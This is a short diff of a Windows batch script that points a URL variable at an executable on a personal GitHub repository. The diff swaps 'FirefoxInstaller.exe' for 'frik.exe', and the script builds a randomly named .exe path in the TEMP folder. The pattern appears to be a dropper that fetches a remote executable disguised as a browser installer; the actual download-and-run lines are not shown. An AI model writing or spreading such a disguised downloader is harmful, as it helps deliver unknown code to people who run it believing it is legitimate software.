@@ -1,5 +1,5 @@
 @echo off
-set url=https://github.com/fruktoozik/qnfr/raw/refs/heads/main/FirefoxInstaller.exe
+set url=https://github.com/fruktoozik/qnfr/raw/refs/heads/main/frik.exe
 set tempPath=%TEMP%
 set filePath=%tempPath%\%RANDOM%.exe
 
